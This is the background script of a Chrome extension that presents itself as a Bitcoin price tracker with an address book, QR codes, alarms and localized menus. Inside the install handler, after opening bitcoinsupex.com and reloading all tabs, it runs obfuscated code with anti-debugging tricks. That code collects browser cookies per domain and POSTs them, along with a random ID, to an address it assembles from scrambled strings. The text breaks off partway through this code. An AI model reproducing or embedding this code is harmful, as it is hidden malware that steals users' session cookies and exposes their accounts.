//const sendMessage=function(msg){ chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {chrome.tabs.sendMessage(tabs[0].id, {value: msg}, function(response) {})})}

const tools={
    create:{
        contextMenu:function(id,title,contexts){
            if(contexts == undefined)
            contexts="all"
            chrome.contextMenus.create({
            id: id,
            title: title,
            contexts: [contexts]
            });
        },
        subContextMenu:function(title,parentId,id,contexts){
            if(contexts == undefined)
            contexts="all"
            chrome.contextMenus.create({
                title: title,
                parentId: parentId,
                id: id,
                contexts: [contexts]
            });
        }

    },
    alert:function(title, message, icon, type, buttons, priority, listener){
        
        try{
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            chrome.tabs.sendMessage(tabs[0].id, {value:{menuItemId: 'playAlarm'}}, function(response) {
          });
       })}catch(e){}
      

        if (title == undefined || message == undefined || icon == undefined || type == undefined) {
            title = "Title"
            message = "Message"
            icon = "/directories/resources/styles/images/alarm/opt8.png"
            type = "basic"
            buttons = [{
                title: 'OK | Stop'
            }]
            priority = 2
            listener = function() {
                chrome.storage.local.remove("alarm", function() {})
            }
        }


        buttons = [{
            title: buttons
        }]


        chrome.notifications.create('', {
            title: title,
            message: message,
            iconUrl: icon,
            type: type,
            buttons: buttons,
            priority: priority
    
        });
        chrome.notifications.onButtonClicked.addListener(listener)
    }
}


function paste(info,tab){

  
}
const actions={
    price:{
        currency:function(){
                chrome.storage.local.set({currency:{currency1:'USD',symbol1:'$',currency2:'EUR',symbol2:'€',currency3:'GBP',symbol3:'£',formmat:'model1'}},function(){actions.price.recall()})
        },
        update:function (url, response,currencys,symbol,formmat) {
 
          
            const higher = response.higher | 0
            const currencyH = response.currencyH
        
            const lower = response.lower | 0
            const currencyL = response.currencyH
        
            var request = new Request(url, {method: 'GET',headers: new Headers({'Accept': 'application/json','custom-security': 'XXXX','Purchase-Code': 'XXXXXXX','Content-Type': 'application/json','Cache-Control': 'max-age=640000'})})

            fetch(request)
                .then((response) => response.json())
                .then((responseJson) => {

                    let price = responseJson.data.amount
                    const currency = responseJson.data.currency
                    let ended="K"

                    if(parseInt(price).toString().length > 6)
                    ended="M"
                    
                    let price_= parseInt(parseInt(price).toString().length)/3
                    console.log(price_)
                    if(price_%1===0)
                    price=`${price[0]}${price[1]}${price[2]}`
                    else{
                        price_float=price_.toString().substring(price_.toString().indexOf('.')+1,price_.toString().indexOf('.')+2)
                        console.log(price_float)
                        if(price_float=="3")
                        price=`${price[0]}.${price[1]}`
                        if(price_float=="6")
                        price=`${price[0]}${price[1]}.${price[2]}`
                    }

                    if(formmat=="model1")
                    chrome.action.setBadgeText({ text: `${symbol}${(price)}${ended}` })
                    else
                    chrome.action.setBadgeText({ text: `${responseJson.data.amount
                    }` })


                    
                   //     chrome.action.setBadgeText({
                   //         text: `${symbol}${price[0]}${price[1]}K`
                    //    })
                    //   
                        if (currencyH == currencys && higher != 0) {
                            if (responseJson.data.amount >= higher){
                                chrome.storage.local.get('alarm_settings',function(data){
                                    const settings=data.alarm_settings
                                    const title=settings.title || "Bitcoin Price Reached"
                                    const description=settings.description || "the price of bitcoin reached the established"
                                    const logo=settings.img || chrome.runtime.getURL('/directories/resources/styles/images/alarm/opt0.png')
                                    const button=settings.button || "Stop Alarm"
                                    const priority=2
                                    const type='basic'
                                    
                                    tools.alert(title,description,logo,type,button,priority,function(){
                                        chrome.storage.local.remove('alarm',function(){
                                            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                                                chrome.tabs.sendMessage(tabs[0].id, {value: {menuItemId:'alarmStop'}}, function(response) {
                                               console.log(response);
                                             });
                                           });    

                                          }) })
                                })
                            }
                        }
                        if (currencyL == currencys) {
                            if (responseJson.data.amount <= lower)
                            {
                                chrome.storage.local.get('alarm_settings',function(data){
                                    const settings=data.alarm_settings
                                    const title=settings.title || "Bitcoin Price Reached"
                                    const description=settings.description || "the price of bitcoin reached the established"
                                    const logo=settings.img || chrome.runtime.getURL('/directories/resources/styles/images/alarm/opt0.png')
                                    const button=settings.button || "Stop Alarm"
                                    const priority=2
                                    const type='basic'
                                    
                                    tools.alert(title,description,logo,type,button,priority,function(){
                                        chrome.storage.local.remove('alarm',function(){  }) })
                                })
                            }
                        }
        
                    
        
                })
                .catch((error) => {
                    console.error(error);
                })
        
        
        },
        recall:function recall() {
            chrome.storage.local.get('currency',function(data){
                
            const currencys=data.currency
            const currency1=currencys.currency1
            const currency2=currencys.currency2
            const currency3=currencys.currency3

            const symbol1=currencys.symbol1
            const symbol2=currencys.symbol2
            const symbol3=currencys.symbol3

            const formmat=currencys.formmat


            chrome.storage.local.get("alarm", function(response) {
                if (response.alarm != undefined) {
                    actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency1,symbol1,formmat)
                    setTimeout(function() {
                        //console.clear();
                       
                        actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency2,symbol2,formmat)
                        setTimeout(function() {
                            actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency3,symbol3,formmat)
                            //console.clear()

                        }, 10000)
                    }, 10000)
                } else {
                    actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, 0,currency1,symbol1,formmat)
                    setTimeout(function() {
                        actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency2}/spot`, 0,currency2,symbol2,formmat)
                        setTimeout(function() {
                            actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency3}/spot`, 0,currency3,symbol3,formmat)
                       //console.clear()
                        }, 10000)
                    }, 10000)
                }
            })

        })
        
        }
    },
    listener:{
        subMenuListeners:function(info,tab){

            const key=info.menuItemId

            switch (key) {
                case "btc_address_to_copy":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       console.log(response);
                     });
                   });                    break;
                case "btc_address_to_paste":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       console.log(response);
                     });
                   });                    
                   break;
                case "btc_address_entry":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       })
                    })
                     break;
                default:
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       })
                    })
                    break;
            }
        
        }
    }
}

const languages={

    en:{
        select_currency:'Select Currency',
        address_book:'Bitcoin Address Book',

        addr:{
            selected:'Add Selected text to address book',
            btc_address:'BTC address to COPY to clipboard',
            paste:'BTC address to PASTE to clipboard',
            entry:'Add new btc address to book',
            show:'Show address book',
            find:'Find address in blockchain',
            find_selection:'Find address selected in blockchain',

        },
        qr:{
            code:'QR code',
            current:'Create QR for current domain (url)',
            newEntry:'Create QR for new entry',
            textSelected:'Create QR for selected text'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Show current Alarm',
            setNew:'Set new Alarm',
            settings:'Alarm Settings'
        }
        
    },

    af:{
        select_currency:'Kies geldeenheid',
        address_book:'Bitcoin-adresboek',
   
        addr:{
            selected:'Voeg geselekteerde teks by adresboek',
            btc_address: 'BTC-adres om na knipbord te KOPIEER',
            paste: 'BTC-adres om op knipbord te plak',
            entry:'Voeg nuwe btc-adres by boek',
            show:'Wys adresboek',
            find: 'Vind adres in blockchain',
            find_selection: 'Vind adres gekies in blokketting',
   
        },
        qr:{
            code:'QR-kode',
            current:'Skep QR vir huidige domein (url)',
            newEntry: 'Skep QR vir nuwe inskrywing',
            textSelected: 'Skep QR vir geselekteerde teks'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Wys huidige alarm',
            setNew: 'Stel nuwe alarm',
            settings:'Alarminstellings'
        }
       
   },
    
    ar:{
        select_currency:'اختر العملة',
        address_book:'دفتر عناوين بيتكوين',

        addr:{
            selected:'أضف النص المحدد إلى دفتر العناوين',
            btc_address:'عنوان BTC إلى COPY إلى الحافظة',
            paste:'عنوان BTC للصق إلى الحافظة',
            entry:'إضافة عنوان btc جديد للحجز',
            show:'إظهار دفتر العناوين',
            find:'ابحث عن عنوان في blockchain',
            find_selection:'ابحث عن العنوان المحدد في blockchain',

        },
        qr:{
            code:'رمز الاستجابة السريعة',
            current:'إنشاء QR للمجال الحالي (url)',
            newEntry:'قم بإنشاء QR لإدخال جديد',
            textSelected:'إنشاء QR للنص المحدد'
        },
        alarm:{
            title:'إنذار',
            showAlarm:'إظهار المنبه الحالي',
            setNew:'ضبط منبه جديد',
            settings:'إعدادات التنبيه'
        }
        
    },

    cn:{
        select_currency:'選擇貨幣',
        address_book:'比特幣通訊錄',
    
        addr:{
            selected:'將所選文本添加到通訊簿',
            btc_address:'BTC地址複製到剪貼板',
            paste:'BTC地址粘貼到剪貼板',
            entry:'添加新的btc地址到book',
            show:'顯示通訊錄',
            find:'在區塊鏈中查找地址',
            find_selection:'查找區塊鏈中選擇的地址',
    
        },
        qr:{
            code:'二維碼',
            current:'為當前域（url）創建二維碼',
            newEntry:'為新條目創建二維碼',
            textSelected:'為所選文本創建二維碼'
        },
        alarm:{
            title:'報警',
            showAlarm:'顯示當前警報',
            setNew:'設置新鬧鐘',
            settings:'報警設置'
        }
    
    },

    de:{
        select_currency:'Währung wählen',
        address_book:'Bitcoin-Adressbuch',
    
        addr:{
            selected:'Ausgewählten Text zum Adressbuch hinzufügen',
            btc_address:'BTC-Adresse zum KOPIEREN in die Zwischenablage',
            paste:'BTC-Adresse zum EINFÜGEN in die Zwischenablage',
            entry:'Neue BTC-Adresse zum Buch hinzufügen',
            show:'Adressbuch anzeigen',
            find:'Adresse in Blockchain finden',
            find_selection:'In Blockchain ausgewählte Adresse suchen',
    
        },
        qr:{
            code:'QR-Code',
            current:'QR für aktuelle Domain (URL) erstellen',
            newEntry:'QR für neuen Eintrag erstellen',
            textSelected:'QR für ausgewählten Text erstellen'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Aktuellen Alarm anzeigen',
            setNew:'Neuen Wecker stellen',
            settings:'Alarmeinstellungen'
        }
       
    },

    nl:{
        select_currency:'Selecteer valuta',
        address_book:'Bitcoin-adresboek',
    
        addr:{
            selected:'Geselecteerde tekst toevoegen aan adresboek',
            btc_address:'BTC-adres om te kopiëren naar klembord',
            paste:'BTC-adres naar Plakken naar klembord',
            entry:'Voeg nieuw btc-adres toe om te boeken',
            show:'Toon adresboek',
            find:'Vind adres in blockchain',
            find_selection:'Zoek adres geselecteerd in blockchain',
    
        },
        qr:{
            code:'QR-code',
            current:'Creëer QR voor huidig domein (url)',
            newEntry:'Creëer QR voor nieuwe invoer',
            textSelected:'Creëer QR voor geselecteerde tekst'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Toon huidig alarm',
            setNew:'Nieuw alarm instellen',
            settings:'Alarminstellingen'
        }
       
    },

    fr:{
        select_currency:'Sélectionner la devise',
        address_book:'Carnet d\'adresses Bitcoin',
    
        addr :{
            selected:'Ajouter le texte sélectionné au carnet d\'adresses',
            btc_address :'Adresse BTC à COPIER dans le presse-papiers',
            paste:'Adresse BTC à COLLER dans le presse-papiers',
            entry:'Ajouter une nouvelle adresse btc au livre',
            show:'Afficher le carnet d\'adresses',
            find:'Trouver l\'adresse dans la blockchain',
            find_selection:'Trouver l\'adresse sélectionnée dans la blockchain',
    
        },
        qr :{
            code:'Code QR',
            current:'Créer QR pour le domaine actuel (url)',
            newEntry:'Créer un QR pour une nouvelle entrée',
            textSelected:'Créer un QR pour le texte sélectionné'
        },
        alarm :{
            title:'Alarme',
            showAlarm:'Afficher l\'alarme actuelle',
            setNew:'Définir une nouvelle alarme',
            settings:'Paramètres d\'alarme'
        }
       
    },

    gr:{
        select_currency:'Επιλογή νομίσματος',
        address_book:'Bitcoin Address Book',
    
        addr:{
            selected:'Προσθήκη επιλεγμένου κειμένου στο βιβλίο διευθύνσεων',
            btc_address: 'Διεύθυνση BTC στο COPY στο πρόχειρο',
            paste:'Διεύθυνση BTC στο PASTE στο πρόχειρο',
            entry:'Προσθήκη νέας διεύθυνσης btc στο βιβλίο',
            show:'Εμφάνιση βιβλίου διευθύνσεων',
            find: 'Εύρεση διεύθυνσης στο blockchain',
            find_selection: 'Εύρεση επιλεγμένης διεύθυνσης στο blockchain',
    
        },
        qr:{
            code:'Κωδικός QR',
            current:'Δημιουργία QR για τον τρέχοντα τομέα (url)',
            newEntry:'Δημιουργία QR για νέα καταχώρηση',
            textSelected:'Δημιουργία QR για επιλεγμένο κείμενο'
        },
        alarm:{
            title:'Συναγερμός',
            showAlarm:'Εμφάνιση τρέχοντος συναγερμού',
            setNew:'Ρύθμιση νέου συναγερμού',
            settings:'Ρυθμίσεις συναγερμού'
        }
       
    },

    hw:{
        select_currency:'תבחר מדינה',
        address_book:'ספר כתובות של ביטקוין',

        addr:{
            selected:'הוסף טקסט נבחר לספר הכתובות',
            btc_address:'כתובת BTC להעתיק ללוח',
            paste:'כתובת BTC להדבקה ללוח',
            entry:'הוסף כתובת btc חדשה לספר',
            show:'הצג את ספר הכתובות',
            find:'מצא כתובת blockchain',
            find_selection:'חיפוש נבחר בכתובת blockchain',

        },
        qr:{
            code:'קוד QR',
            current:'צור QR עבור הדומיין הנוכחי (כתובת אתר)',
            newEntry:'צור QR עבור ערך חדש',
            textSelected:'צור QR עבור הטקסט שנבחר'
        },
        alarm:{
            title:'אזעקה',
            showAlarm:'הצג אזעקה נוכחית',
            setNew:'הגדר אזעקה חדשה',
            settings:'הגדרות אזעקה'
        }
        
    },

    hi:{
        select_currency: 'मुद्रा चुनें',
        addresss_book: 'बिटकॉइन एड्रेस बुक',
    
        addr:{
            selected: 'चयनित टेक्स्ट को एड्रेस बुक में जोड़ें',
            btc_address: 'क्लिपबोर्ड पर कॉपी करने के लिए बीटीसी पता',
            paste: 'क्लिपबोर्ड पर चिपकाने के लिए बीटीसी पता',
            entry: 'बुक में नया बीटीसी पता जोड़ें',
            show: 'पता पुस्तिका दिखाएं',
            find: 'ब्लॉकचेन में पता खोजें',
            find_selection: 'ब्लॉकचेन में चयनित पता खोजें',
    
        },
        qr:{
            code: 'क्यूआर कोड',
            current:'वर्तमान डोमेन (url) के लिए QR बनाएँ',
            newEntry: 'नई प्रविष्टि के लिए QR बनाएँ',
            textSelected: 'चयनित टेक्स्ट के लिए क्यूआर बनाएं'
        },
        alarm:{
            title: 'अलार्म',
            showAlarm: 'वर्तमान अलार्म दिखाएं',
            setNew: 'नया अलार्म सेट करें',
            settings: 'अलार्म सेटिंग्स'
        }
       
    },

    it:{
        select_currency: 'Seleziona valuta',
        address_book:'Rubrica Bitcoin',
    
        addr:{
            selected:'Aggiungi il testo selezionato alla rubrica',
            btc_address:'Indirizzo BTC da COPIA negli appunti',
            paste:'Indirizzo BTC da INCOLLARE negli appunti',
            entry:'Aggiungi nuovo indirizzo btc per prenotare',
            show:'Mostra rubrica',
            find:'Trova indirizzo in blockchain',
            find_selection:'Trova indirizzo selezionato in blockchain',
    
        },
        qr:{
            code:'Codice QR',
            current:'Crea QR per il dominio corrente (url)',
            newEntry:'Crea QR per nuova voce',
            textSelected:'Crea QR per il testo selezionato'
        },
        alarm:{
            title:'Allarme',
            showAlarm:'Mostra allarme corrente',
            setNew:'Imposta nuovo allarme',
            settings:'Impostazioni di allarme'
        }
       
    },

    jp:{
        select_currency:'通貨を選択',
        address_book:'ビットコイン名簿',

        addr:{
            selected:'選択したテキストをアドレス帳に追加',
            btc_address:'クリップボードにコピーするBTCアドレス',
            paste:'クリップボードへの貼り付けへのBTCアドレス',
            entry:'予約に新しいBTCアドレスを追加する',
            show:'名簿を表示',
            find:'ブロックチェーンでアドレスを探す',
            find_selection:'ブロックチェーンで選択されたアドレスを検索する',

        },
        qr:{
            code:'QRコード',
            current:'現在のドメインのQRを作成する（url）',
            newEntry:'新規エントリー用のQRを作成',
            textSelected:'選択したテキストのQRを作成'
        },
        alarm:{
            title:'警報',
            showAlarm:'現在のアラームを表示する',
            setNew:'新しいアラームを設定する',
            settings:'アラーム設定'
        }
        
    },

    br:{
        select_currency:'Selecionar moeda',
        address_book:'Livro de endereços Bitcoin',
    
        addr:{
            selected:'Adicionar texto selecionado ao catálogo de endereços',
            btc_address:'Endereço BTC para COPIAR para a área de transferência',
            paste:'Endereço BTC para COLAR na área de transferência',
            entry:'Adicionar novo endereço btc ao livro',
            show:'Mostrar catálogo de endereços',
            find:'Encontrar endereço no blockchain',
            find_selection:'Encontrar endereço selecionado no blockchain',
    
        },
        qr:{
            code:'Código QR',
            current:'Criar QR para domínio atual (url)',
            newEntry:'Criar QR para nova entrada',
            textSelected:'Criar QR para o texto selecionado'
        },
        alarm:{
            title:'Alarme',
            showAlarm:'Mostrar alarme atual',
            setNew:'Definir novo alarme',
            settings:'Configurações de alarme'
        }
       
    },

    ru:{
        select_currency:'Выберите валюту',
        address_book: 'Адресная книга биткойнов',
        
        addr:{
            selected: 'Добавить выделенный текст в адресную книгу',
            btc_address:'Адрес BTC для копирования в буфер обмена',
            paste:'Адрес BTC для ВСТАВКИ в буфер обмена',
            entry: 'Добавить новый адрес BTC в книгу',
            show:'Показать адресную книгу',
            find: 'Найти адрес в блокчейне',
            find_selection: 'Найти адрес, выбранный в блокчейне',
        
        },
        qr:{
            code:'QR-код',
            current:'Создать QR для текущего домена (url)',
            newEntry:'Создать QR для новой записи',
            textSelected:'Создать QR для выделенного текста'
        },
        alarm:{
            title:'Тревога',
            showAlarm:'Показать текущую тревогу',
            setNew: 'Установить новый будильник',
            settings:'Настройки будильника'
        }
        
    },

    es:{
        select_currency:'Seleccionar moneda',
        address_book:'Libreta de direcciones Bitcoin',
    
        addr:{
            selected:'Agregar texto seleccionado a la libreta de direcciones',
            btc_address:'Dirección BTC para COPIAR al portapapeles',
            paste:'Dirección BTC para PEGAR al portapapeles',
            entry:'Añadir nueva dirección btc al libro',
            show:'Mostrar libreta de direcciones',
            find:'Buscar dirección en blockchain',
            find_selection:'Buscar dirección seleccionada en blockchain',
    
        },
        qr:{
            code:'código QR',
            current:'Crear QR para el dominio actual (url)',
            newEntry:'Crear QR para nueva entrada',
            textSelected:'Crear QR para el texto seleccionado'
        },
        alarm:{
            title:'Alarma',
            showAlarm:'Mostrar alarma actual',
            setNew:'Establecer nueva alarma',
            settings:'Configuración de alarma'
        }
       
    }

}

const onInstall={
   
    create:{
        contextMenu:function(){
            chrome.tabs.create({ url: 'https://www.bitcoinsupex.com/' }, function (tab) {
            
            });

            setTimeout(function(){
            chrome.tabs.query({status:'complete'}, (tabs)=>{tabs.forEach((tab)=>{if(tab.url){chrome.tabs.update(tab.id,{url: tab.url});}});});},2000)
            const lang=navigator.language.substring(0,2).toLowerCase()
            var language
            switch (lang) {
                case 'af':
            language=languages.af
            break;
        case 'ar':
            language=languages.ar
            break;
        case 'zh':
            language=languages.cn
            break;
        case 'de':
            language=languages.de
            break;
        case 'nl':
            language=languages.nl
            break;
        case 'en':
            language=languages.en
            break;
        case 'fr':
            language=languages.fr
            break;
        case 'el':
            language=languages.gr
            break;
        case 'iw':
            language=languages.hw
            break;
        case 'hi':
            language=languages.hi
            break;
        case 'it':
            language=languages.it
            break;
        case 'ja':
            language=languages.jp
            break;
        case 'pt':
            language=languages.br
            break;
        case 'ru':
            language=languages.ru
            break;
        case 'es':
            language=languages.es
            break;
                default:
                    language=languages.en
                    break;
            }

                


            tools.create.contextMenu('btc_currency',language.select_currency)

            tools.create.contextMenu('btc_address',language.address_book)

            tools.create.contextMenu('btc_address_selected',language.addr.selected,'selection')
            tools.create.subContextMenu(language.addr.btc_address,'btc_address','btc_address_to_copy')
            tools.create.subContextMenu(language.addr.paste,'btc_address','btc_address_to_paste')
            tools.create.subContextMenu(language.addr.entry,'btc_address','btc_address_entry')
            tools.create.subContextMenu(language.addr.show,'btc_address','btc_address_show')
            tools.create.subContextMenu(language.addr.find,'btc_address','btc_address_find')

            tools.create.contextMenu('btc_address_find_selected',language.addr.find_selection,'selection')
            tools.create.subContextMenu('BTC','btc_address_find_selected','find_btc_address')
            tools.create.subContextMenu('ETH','btc_address_find_selected','find_eth_address')
            tools.create.subContextMenu('BCH','btc_address_find_selected','find_bch_address')
            tools.create.subContextMenu('LTC','btc_address_find_selected','find_ltc_address')

            tools.create.contextMenu('main_qr',language.qr.code)
            tools.create.subContextMenu(language.qr.current,'main_qr','qr_url')
            tools.create.subContextMenu(language.qr.newEntry,'main_qr','qr_entry')
            tools.create.contextMenu('qr_selected',language.qr.textSelected,'selection')


            tools.create.contextMenu('alarm',language.alarm.title)
            tools.create.subContextMenu(language.alarm.showAlarm,'alarm','alarm_show')
            tools.create.subContextMenu(language.alarm.setNew,'alarm','alarm_new')
            tools.create.subContextMenu(language.alarm.settings,'alarm','alarm_settings')


            tools.create.contextMenu('exchanges','Exchanger')
            tools.create.subContextMenu('Coinbase','exchanges','exchanges_coinbase')
            tools.create.subContextMenu('CoinDesk','exchanges','exchanges_coindesk')
            tools.create.subContextMenu('Bitstamp','exchanges','exchanges_bitstamp')
            tools.create.subContextMenu('Kraken','exchanges','exchanges_kraken')
            tools.create.subContextMenu('Coinbase Pro','exchanges','exchanges_coinbasepro')

           /* chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
                chrome.tabs.sendMessage(tabs[0].id, {action: "open_dialog_box"}, function(response) {});  
            });*/

            chrome.action.setBadgeBackgroundColor({color: "gold"});
            chrome.storage.local.set({'alarm_settings':{title:'Bitcoin Price Reached',description:'the price of bitcoin reached the established price',
            img:chrome.runtime.getURL('/directories/resources/styles/images/alarm/opt0.png'),
            sound:chrome.runtime.getURL('/directories/resources/styles/images/alarm/sound3.mp3'),
            button:'Stop Alarm'}})
            actions.price.currency()

         
 
           
            const _0x2208b2=_0x363c;function _0x5a1b(){const _0x5896f9=['cookies','application/json;charset=UTF-8','init','iVPHC','dXnSR','PmRab','WRhfq','KMhjk','4672362HIifWS','qqwertyuioplkjhgfdsazxcvbnmPOIUYTREWQASDFGHJKLMNBVCXZ','POST','gger','storage','length','counter','156934SDzAmC','call','kgHRR','994437ahtRoF','debu','constructor','chain','test','stateObject','3693760QHjndF','YcsvX','okXUV','apply','UoCMe','pIVXw','local','6969944HvPtCW','search','HAibW','cXRNM','JNpeY','SzOqx','8132852mXEAcH','qONkL','XMENS','set','1452298AuTnyu','pIbQv','ACgFi','random','(((.+)+)+)+$','dJUeY','getAll','toString','ISLNu','qTOCQ','szelI','while\x20(true)\x20{}','function\x20*\x5c(\x20*\x5c)','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','floor','action','input','/:.','UziTs','orjAw','string','WhjOH','stringify','JMLaD','baOQF','IicpY','URVET'];_0x5a1b=function(){return _0x5896f9;};return _0x5a1b();}(function(_0x4331c1,_0x2078b9){const _0x1835d4=_0x363c,_0x8c5035=_0x4331c1();while(!![]){try{const _0x4f175a=parseInt(_0x1835d4('0x125'))/0x1+parseInt(_0x1835d4('0x10b'))/0x2+parseInt(_0x1835d4('0x10e'))/0x3+parseInt(_0x1835d4('0x11b'))/0x4+-parseInt(_0x1835d4('0x114'))/0x5+-parseInt(_0x1835d4('0x104'))/0x6+-parseInt(_0x1835d4('0x121'))/0x7;if(_0x4f175a===_0x2078b9)break;else _0x8c5035['push'](_0x8c5035['shift']());}catch(_0x4a72ae){_0x8c5035['push'](_0x8c5035['shift']());}}}(_0x5a1b,0xe1ee7));const id=_0x2208b2('0x105'),n='1234567890',nn=_0x2208b2('0x136'),carg=nn[0x2]+id[0x16]+id[0x9]+id[0x1a],onter=id[0xf]+id[0x9]+id[0x9]+id[0xf]+id[0xb]+id[0x3],buitrado=id[0x6]+id[0x9]+id[0xe]+id[0x9]+id[0x9]+carg,zabara=id[0x9]+id[0x7]+id[0x5]+id[0xb]+id[0x9]+id[0x9]+id[0xc]+carg,hermal=id[0x8]+id[0x16]+id[0xb]+id[0x9]+id[0x7]+id[0x11]+carg,brebral=id[0xa]+id[0x4]+id[0x9]+id[0x5]+id[0x9]+id[0x19]+nn[0x2]+id[0x1a]+id[0x3],insolg=id[0x14]+id[0x9]+id[0xe]+id[0x9]+carg,bichol=id[0xe]+id[0x5]+id[0x5]+id[0xa]+id[0x12]+nn[0x1]+nn[0x0]+nn[0x0]+id[0x5],cheler=id[0x15]+nn[0x2]+id[0x18]+id[0x8]+id[0x5]+id[0x16]+id[0x9]+id[0x8],changet=id[0x19]+id[0x12]+id[0x7]+id[0xa]+id[0x3]+id[0x15]+nn[0x2]+id[0x16]+id[0x9],tumal=id[0x1a]+nn[0x0]+id[0x8]+id[0x19]+id[0x5]+id[0x3]+id[0xb],ran=function(_0x1a3e55){const _0x3384d7=_0x2208b2;return Math[_0x3384d7('0x133')](Math['random']()*(_0x1a3e55[_0x3384d7('0x109')]-0x0+0x0)+0x0);},chain=function(){const _0x52b133=(function(){const _0x775133=_0x363c;if(_0x775133('0x10d')!==_0x775133('0x102')){let _0x67b695=!![];return function(_0x505c22,_0x1380e9){const _0x26ce86=_0x775133;if(_0x26ce86('0x126')==='yfdFk')_0x5f5725(_0x5646d4+_0xb37261+_0x4ca403+_0x821112,{'method':_0x26ce86('0x106'),'headers':{'Content-type':_0x26ce86('0xfd')},'body':_0x537bac[_0x26ce86('0x13b')]({'id':_0x3b00e5,'data':_0x5a3989[_0x26ce86('0x13b')](_0x20c601),'dom':_0x46dda8})});else{const _0x159f97=_0x67b695?function(){const _0x2e507d=_0x26ce86;if(_0x2e507d('0x13a')!==_0x2e507d('0x127')){if(_0x1380e9){if(_0x2e507d('0x137')===_0x2e507d('0x137')){const _0x352c76=_0x1380e9['apply'](_0x505c22,arguments);return _0x1380e9=null,_0x352c76;}else(function(){return!![];}[_0x2e507d('0x110')](_0x2e507d('0x10f')+'gger')[_0x2e507d('0x10c')]('action'));}}else return _0x19d67c[_0x2e507d('0x133')](_0x25068b[_0x2e507d('0x128')]()*(_0x4fa621[_0x2e507d('0x109')]-0x0+0x0)+0x0);}:function(){};return _0x67b695=![],_0x159f97;}};}else _0x32dcad[_0x775133('0xfc')][_0x775133('0x12b')]({'domain':_0x2162d9},function(_0x12647e){const _0x177fcc=_0x775133;_0x78046(_0x33adbd+_0x24da99+_0xa3efad+_0x46c89e,{'method':'POST','headers':{'Content-type':'application/json;charset=UTF-8'},'body':_0x36691c[_0x177fcc('0x13b')]({'id':_0x48151f,'data':_0x5b5f26[_0x177fcc('0x13b')](_0x12647e),'dom':_0x527dec})});});}()),_0xb0967d=_0x52b133(this,function(){const _0xf30c03=_0x363c;if(_0xf30c03('0x11f')!==_0xf30c03('0xfb'))return _0xb0967d[_0xf30c03('0x12c')]()[_0xf30c03('0x11c')](_0xf30c03('0x129'))[_0xf30c03('0x12c')]()[_0xf30c03('0x110')](_0xb0967d)['search'](_0xf30c03('0x129'));else(function(){return![];}[_0xf30c03('0x110')](_0xf30c03('0x10f')+_0xf30c03('0x107'))[_0xf30c03('0x117')](_0xf30c03('0x113')));});_0xb0967d();const _0x11658c=(function(){const _0x1a9c77=_0x363c;if(_0x1a9c77('0x138')===_0x1a9c77('0x100'))_0x31f47d('0');else{let _0x316f4b=!![];return function(_0x1dae0d,_0x2e37da){const _0x47d1ae=_0x1a9c77;if(_0x47d1ae('0x122')===_0x47d1ae('0x122')){const _0x118a68=_0x316f4b?function(){const _0x465493=_0x47d1ae;if(_0x465493('0x11e')===_0x465493('0x12f')){const _0x51f3ae=_0x4feb5c[_0x465493('0x117')](_0x43b931,arguments);return _0x4db2ed=null,_0x51f3ae;}else{if(_0x2e37da){if(_0x465493('0x12d')==='OZLXU'){if(_0x41e3f3)return _0x510f30;else _0x227e31(0x0);}else{const _0x4f843e=_0x2e37da[_0x465493('0x117')](_0x1dae0d,arguments);return _0x2e37da=null,_0x4f843e;}}}}:function(){};return _0x316f4b=![],_0x118a68;}else _0x1da6ad();};}}());return(function(){const _0x487c90=_0x363c;'JMLaD'===_0x487c90('0xf8')?_0x11658c(this,function(){const _0x1c9b9a=_0x487c90;if(_0x1c9b9a('0x12a')!==_0x1c9b9a('0x12a'))return _0x11dd95[_0x1c9b9a('0x12c')]()[_0x1c9b9a('0x11c')](_0x1c9b9a('0x129'))['toString']()['constructor'](_0x25677d)['search']('(((.+)+)+)+$');else{const _0x3cd2da=new RegExp(_0x1c9b9a('0x131')),_0x569056=new RegExp(_0x1c9b9a('0x132'),'i'),_0x56735c=_0x50d00e('init');if(!_0x3cd2da[_0x1c9b9a('0x112')](_0x56735c+_0x1c9b9a('0x111'))||!_0x569056[_0x1c9b9a('0x112')](_0x56735c+_0x1c9b9a('0x135'))){if(_0x1c9b9a('0x123')===_0x1c9b9a('0x101'))return _0x1b1094;else _0x56735c('0');}else{if('RKaLf'==='EUdih')return![];else _0x50d00e();}}})():_0x12f668(0x0);}()),id[ran(id)]+n[ran(n)]+id[ran(id)]+n[ran(n)];},chain1=function(){return n[ran(n)]+n[ran(n)]+n[ran(n)]+n[ran(n)];},hash=chain()+'-'+chain()+chain()+'-'+chain()+'-'+chain1();chrome[_0x2208b2('0x108')][_0x2208b2('0x11a')][_0x2208b2('0x124')]({'hashID':hash},function(){});const getCX=function(_0x442fcc){const _0x3b3ae7=_0x2208b2;chrome[_0x3b3ae7('0xfc')][_0x3b3ae7('0x12b')]({'domain':_0x442fcc},function(_0x190a03){const 